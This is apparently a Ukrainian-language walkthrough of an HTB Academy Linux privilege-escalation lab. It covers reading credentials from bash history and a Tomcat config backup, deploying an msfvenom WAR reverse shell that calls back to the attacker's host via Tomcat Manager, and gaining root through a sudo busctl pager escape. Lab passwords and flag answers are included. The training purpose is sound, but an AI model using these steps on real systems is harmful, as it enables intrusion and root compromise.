# Linux Local Privilege Escalation - Skills Assessment

## Лінк

- [HTB Academy – Linux Local Privilege Escalation: Skills Assessment](https://academy.hackthebox.com/app/module/51/section/480) [fexsec](https://fexsec.net/hackthebox/linux_privesc/)

***

## Тема уроку

Linux Local Privilege Escalation – Skills Assessment: послідовне проходження 5 задач (Q1–Q5), які демонструють ключові техніки локальної прівеск: приховані файли, реюз паролів, лог‑файли, зовнішні сервіси (Tomcat) та sudo‑міссконфіг із GTFOBins. [cnblogs](https://www.cnblogs.com/darkpool/p/17421209.html)

***

## Ціль

- Навчитися виконувати **повну локальну енумерацію**:
  - домашні каталоги, приховані файли (`.config`, `.bash_history`);
  - системні лог‑файли (`/var/log`);  
  - SUID‑бінарники, cron’и, systemd‑таймери/сервіси; [bordergate.co](https://www.bordergate.co.uk/linux-privilege-escalation/)
- Відпрацювати 5 векторів:
  1. Пошук флагів у прихованих файлах (`flag1.txt`).  
  2. Використання слабких / повторно використаних паролів (`flag2.txt`).  
  3. Читання флагів із логів (`flag3.txt`).  
  4. Експлуатація Tomcat Manager (WAR‑reverse shell) для отримання `tomcat` й `flag4.txt`. [cnblogs](https://www.cnblogs.com/darkpool/p/17421209.html)
  5. Зловживання `sudo`‑правами на `busctl` через GTFOBins для root і `flag5.txt`. [gtfobins](https://gtfobins.org/gtfobins/busctl/)

***

## Список запитань

1. **Q1:** Де знаходиться `flag1.txt` і як його знайти без прівеску?  
2. **Q2:** Як історія команд користувача `barry` веде до пароля й читання `flag2.txt`?  
3. **Q3:** Як знайти й прочитати `flag3.txt` у логах `/var/log`?  
4. **Q4:** Як використати Tomcat Manager (порт 8080) та користувача `tomcatadm` для деплою WAR і отримання `flag4.txt` як `tomcat`? [cnblogs](https://www.cnblogs.com/darkpool/p/17421209.html)
5. **Q5:** Як, маючи `sudo NOPASSWD: /usr/bin/busctl`, отримати root‑шелл через GTFOBins і прочитати `flag5.txt`? [gtfobins.linuxsec](https://gtfobins.linuxsec.org/gtfobins/busctl/)

***

## Конспект (тільки вірні команди з поясненнями)

### Q1 – Hidden file: `flag1.txt`

**Команди**

```bash
# Логін
ssh htb-student@10.129.119.84     # password: Academy_LLPE!

# Базова інфа
whoami
id
hostname
uname -a

# Пошук флагів по сигнатурі
grep -Irl "LLPE{" / 2>/dev/null
# /home/htb-student/.config/.flag1.txt

# Читання флагу
cat /home/htb-student/.config/.flag1.txt
# LLPE{d0n_ov3rl00k_h1dden_f1les!}
```

**Пояснення:** перший флаг лежить у прихованій директорії `.config` у домашньому каталозі `htb-student`; звичайний `grep` по всій ФС швидко його знаходить. [fexsec](https://fexsec.net/hackthebox/linux_privesc/)

***

### Q2 – Weak user behaviour: `flag2.txt`

**Команди**

```bash
# Знайти flag2.txt
find /home -maxdepth 4 -type f -name "*flag2.txt" 2>/dev/null
# /home/barry/flag2.txt

# Доступ як htb-student
cat /home/barry/flag2.txt
# Permission denied

# Подивитись історію barry
cat /home/barry/.bash_history 2>/dev/null
# ...
# sshpass -p 'i_l0ve_s3cur1ty!' ssh barry_adm@dmz1.inlanefreight.local
# ...

# Логін під barry (Pwnbox)
ssh barry@10.129.119.84
# password: i_l0ve_s3cur1ty!

cd /home/barry
cat flag2.txt
# LLPE{ch3ck_th0se_cmd_l1nes!}
```

**Пояснення:** `.bash_history` видає плейнтекст‑пароль, який користувач повторно використовує й локально; це дозволяє увійти як `barry` і прочитати `flag2.txt`. [github](https://github.com/gunyakit/command-cheatsheet/blob/main/4.Privilege-Escalation/4.3.GTFOBins-Linux.md)

***

### Q3 – Logs: `flag3.txt`

**Команди**

```bash
# Пошук flag3.txt без шуму від Permission denied
find / -name "flag3.txt" 2>&1 | grep -v "Permission denied"
# /var/log/flag3.txt

# Читання флагу
cat /var/log/flag3.txt
# LLPE{h3y_l00k_a_fl@g!}
```

**Пояснення:** флаг лежить у `/var/log`, до якого мають читальний доступ непрівілейовані користувачі; лог‑файли часто містять корисну інформацію. [bordergate.co](https://www.bordergate.co.uk/linux-privilege-escalation/)

***

### Q4 – Tomcat Manager RCE: `flag4.txt`

**Команди (енумерація й креденшли)**

```bash
# Перевірити порт 8080
ss -tulpn | grep 8080
# tcp LISTEN *:8080

# Конфіги Tomcat
ls -la /etc/tomcat9
ls -la /var/lib/tomcat9

# Tomcat users конфіг
find / -name "tomcat-users*.xml*" 2>/dev/null
cat /etc/tomcat9/tomcat-users.xml.bak
# user tomcatadm / password T0mc@t_s3cret_p@ss!
```

**На Pwnbox – WAR‑шелл і деплой**

```bash
# Генерація WAR reverse shell
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=10.10.14.195 LPORT=1234 -f war > shell.war

# Деплой через manager/text
curl -u 'tomcatadm:T0mc@t_s3cret_p@ss!' \
  -T shell.war \
  "http://10.129.119.84:8080/manager/text/deploy?path=/shell&update=true"
# OK - Deployed application at context path [/shell]

# Лістенер
nc -lvnp 1234
# Listening ...

# Тригер WAR‑шеллу
curl "http://10.129.119.84:8080/shell/"
# на nc: шелл від tomcat
```

**У tomcat‑шеллі**

```bash
whoami
# tomcat

cd /var/lib/tomcat9
ls
# conf flag4.txt lib logs policy webapps work

cat flag4.txt
# LLPE{im_th3_m@nag3r_n0w}
```

**Пояснення:** Tomcat Manager із валідними креденшлами дозволяє завантажити й запустити WAR‑reverse shell, що дає доступ від імені `tomcat` та до флагу в `/var/lib/tomcat9/flag4.txt`. [cnblogs](https://www.cnblogs.com/darkpool/p/17421209.html)

***

### Q5 – Sudo misconfig + GTFOBins (busctl): `flag5.txt`

**Команди (sudo перевірка)**

У томcat‑шеллі:

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/busctl
```

**Shell upgrade для комфортного pager’а**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 columns 120
```

**GTFOBins для busctl (sudo):** [ddosi](https://www.ddosi.org/gtfo/gtfobins/busctl/index.html)

```bash
# Запустити busctl від root через sudo
sudo busctl --show-machine
# з’являється D-Bus таблиця в pager’і (less/подібний)

# У pager:
!
/bin/bash
```

Після коректного виконання:

```bash
whoami
# root
```

**Пошук і читання flag5**

```bash
find / -name "flag5.txt" 2>/dev/null
# /root/flag5.txt

cat /root/flag5.txt
# LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!}
```

**Пояснення:** `busctl` у режимі `--show-machine` запускає pager; через `sudo` він виконується як root і не дропає привілеї, а pager дозволяє викликати `/bin/bash` через `!` – це дає повний root‑шелл, після чого флаг5 читається з `/root/flag5.txt`. [gtfobins](https://gtfobins.org/gtfobins/busctl/)
